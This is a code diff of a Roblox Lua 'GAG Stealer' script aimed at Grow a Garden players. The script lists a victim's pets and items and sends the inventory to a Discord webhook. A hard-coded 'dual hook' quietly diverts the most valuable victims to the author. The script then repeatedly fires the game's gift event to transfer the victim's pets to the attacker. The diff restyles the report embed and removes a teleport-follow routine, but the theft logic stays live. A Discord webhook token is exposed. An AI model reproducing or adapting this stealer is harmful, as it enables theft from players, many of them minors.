@@ -10,15 +10,13 @@ local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUt
 local petRegistry = require(ReplicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
--- SETTINGS OUTSIDE
 local Webhook = getfenv().Webhook
 local Username = getfenv().Username
 
--- DUAL HOOK CONFIG
 local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
 local DualUsername = "namnnni2"
 
-if not Webhook or not Username then return warn("Missing Webhook or Username") end
+if not Webhook or not Username then return end
 
 local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
@@ -54,6 +52,7 @@ for _, tool in ipairs(backpack:GetChildren()) do
 		if tool:GetAttribute("ItemType") == "Pet" then
 			local id = tool:GetAttribute("PET_UUID")
 			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
+			if not petData or not petData.PetType then continue end
 			local petName = petData.PetType
 			local weight = tonumber(petData.PetData.BaseWeight) or 0
 			local value = calcPetValue(petData)
@@ -81,11 +80,8 @@ local useDual = totalValue >= 1000000000000
 local finalWebhook = useDual and DualWebhook or Webhook
 local finalUsername = useDual and DualUsername or Username
 
--- CONTENT FOR EMBED
-local content = (hasRare or hasHeavy) and "@everyone\n" or ""
-content ..= "🚨 **GAG OPS - Steal & Gift Mission** 🚨\n"
-content ..= ">>> Mission success ✅\n"
-content ..= "**JobId:** `" .. game.JobId .. "`\n"
+local content = (hasRare or hasHeavy) and "@everyone 🚨 Mission Alert!\n" or ""
+content ..= "🚨 **GAG OPS - Steal & Gift Mission** 🚨\n>>> Mission success ✅\n**JobId:** `" .. game.JobId .. "`\n"
 
 local lines = ""
 for _, item in ipairs(itemsToSend) do
@@ -111,16 +107,26 @@ for _, item in ipairs(itemsToSend) do
 end
 
 local embed = {
-	title = "🎯 Steal & Gift Report — GAG OPS",
-	description = "Target inventory extracted 🥷💨",
-	color = 16711680,
+	title = "🎯 GAG OPS - Steal & Gift Report",
+	description = "Inventory extraction complete. Mission success ✅",
+	color = 0xFF0000,
+	author = {
+		name = "GAG Stealer System",
+		icon_url = "https://cdn-icons-png.flaticon.com/512/2809/2809640.png"
+	},
+	thumbnail = {
+		url = "https://media.tenor.com/l2vJQk1ZoTIAAAAC/ninja-cat.gif"
+	},
 	fields = {
 		{name = "🎯 Victim", value = plr.Name, inline = true},
 		{name = "💰 Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
 		{name = "🗺️ Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
 		{name = "🧾 Inventory Log", value = lines, inline = false}
 	},
-	footer = { text = "GAG Stealer by namnnni2" },
+	footer = {
+		text = "🦊 GAG Stealer by namnnni2 — Stay stealthy",
+		icon_url = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
+	},
 	timestamp = DateTime.now():ToIsoDate()
 }
 
@@ -145,7 +151,7 @@ pcall(function()
 	end
 end)
 
--- FOLLOW & AUTOGIFT
+-- FOLLOW & AUTO GIFT
 
 local targetName = useDual and DualUsername or Username
 local targetPlr
@@ -158,44 +164,15 @@ local function gift(tool)
 	ReplicatedStorage.Events.GiftPet:FireServer(unpack(args))
 end
 
-local function followAndGift()
-	if not targetPlr then return end
-	local char = plr.Character or plr.CharacterAdded:Wait()
-	local hrp = char:WaitForChild("HumanoidRootPart")
-	local tChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
-	local tHrp = tChar:WaitForChild("HumanoidRootPart")
-
-	while targetPlr and targetPlr.Parent do
-		if (tHrp.Position - hrp.Position).Magnitude > 5 then
-			hrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 3)
-		end
-
-		-- Auto use proximity prompt (hold if needed)
-		for _, prompt in ipairs(tChar:GetDescendants()) do
-			if prompt:IsA("ProximityPrompt") then
-				if prompt.HoldDuration > 0 then
-					fireproximityprompt(prompt, true)
-					task.wait(prompt.HoldDuration + 0.1)
-					fireproximityprompt(prompt, false)
-				else
-					fireproximityprompt(prompt)
-				end
-			end
-		end
-
-		task.wait(0.2)
+local function waitUntilGone(tool)
+	while tool.Parent == backpack do
+		gift(tool)
+		task.wait(0.5)
 	end
 end
 
 local function giftSequential()
 	if not targetPlr then return end
-
-	local function waitUntilGone(tool)
-		while tool.Parent == backpack do
-			gift(tool)
-			task.wait(0.5)
-		end
-	end
 
 	for _, item in ipairs(itemsToSend) do
 		if item.Type == "Pet" and table.find(rarePets, item.Name) then
@@ -224,9 +201,7 @@ end
 
 local function onTargetReady(p)
 	targetPlr = p
-
 	p.Chatted:Connect(function()
-		task.spawn(followAndGift)
 		task.spawn(giftSequential)
 	end)
 end
